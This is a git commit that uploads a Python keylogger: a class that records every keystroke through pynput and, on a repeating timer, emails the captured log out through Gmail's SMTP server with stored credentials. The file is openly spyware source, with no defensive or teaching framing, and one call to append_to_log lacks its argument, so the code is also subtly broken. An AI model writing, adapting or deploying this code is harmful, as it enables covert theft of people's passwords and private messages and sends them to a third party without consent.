4c745f548270cd45b2ef2281d85f106c5a1614e8
tmbumd <82411110+tmbumd@users.noreply.github.com>
2023-02-22 14:54:41 -0500

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python
+import pynput.keyboard
+import threading
+import smtplib
+log = " "
+
+class Keylogger:
+    def __init__(self, time_interval, email, password): 
+        self.log = " KeyLogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+    
+    def append_to_log(self, string ):
+        self.log = self.log + string
+    
+    def process_keystroke(self, key):
+        try:
+            current_key = str(key.char)
+            self.append_to_log()
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key =  " " + str(key) + " "
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.send_email(self.email, self.password, "\n\n" + self.log)
+        self.log = " "
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+    
+    def send_email(self, email, password, message):
+      server = smtplib.SMTP('smtp.gmail.com', 587)
+      server.starttls()
+      server.login(email, password)
+      server.sendmail(email, email, message)
+      server.quit()
+
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join() 
+    
